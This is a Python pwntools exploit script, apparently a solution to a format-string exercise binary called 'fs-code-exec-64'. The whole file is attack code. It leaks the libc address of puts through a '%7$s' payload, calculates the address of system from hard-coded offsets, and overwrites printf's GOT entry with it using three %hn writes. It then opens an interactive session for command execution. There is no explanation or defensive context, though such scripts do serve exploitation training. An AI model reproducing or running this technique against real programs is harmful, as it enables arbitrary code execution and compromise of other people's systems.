#!/usr/bin/env python

from pwn import *
env = {
        'PATH' : '.:/bin:/usr/bin'
        }

p = process('fs-code-exec-64', env=env)
puts_got = p.elf.got['puts']
printf_got = p.elf.got['printf']
print(hex(printf_got))
print(p.recv())

buf = '%7$sBBBB' + p64(puts_got)

p.sendline(buf)

data = p.recv()

print(repr(data))

d = data.split(' ')[1][:6] + "\x00\x00"

libc_puts = u64(d)

print(hex(libc_puts))

"""
$1 = {<text variable, no debug info>} 0x7ffff7a7c690 <_IO_puts>
$2 = {<text variable, no debug info>} 0x7ffff7a52390 <__libc_system>
"""

libc_system = libc_puts - 0x7ffff7a7c690 + 0x7ffff7a52390

first = libc_system & 0xffff
second = ((libc_system >> 16) & 0xffff) - first
while second < 0:
    second += 0x10000

third = ((libc_system >> 32) & 0xffff) - second - first
while third < 0:
    third += 0x10000


buf = '%' + ('%05dx' % first) + '%11$hn' + '%' + ('%05dx' % second) + '%12$hn' + '%' + ('%05dx' % third) + '%13$hn' + 'A' + p64(printf_got) + p64(printf_got+2) + p64(printf_got+4)

p.sendline(buf)

p.interactive()
